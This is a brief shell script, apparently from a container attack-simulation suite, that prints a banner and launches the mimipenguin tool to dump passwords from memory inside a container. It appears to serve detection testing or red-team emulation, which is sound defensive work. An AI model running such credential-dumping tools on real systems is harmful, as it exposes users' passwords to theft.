#!/bin/sh
# Shortname: credentials_dumping
# Description: Runs mimipenguin and tries to dump passwords from inside the container environment.

SCRIPT_DIR=$(cd "$(dirname "$0")" && pwd)

echo -e "\e[92mExecuting Credential Access via Credential Dumping. This script is running mimipenguin trying to dump passwords from inside the container environment"
"$SCRIPT_DIR/mimipenguin/mimipenguin.sh"
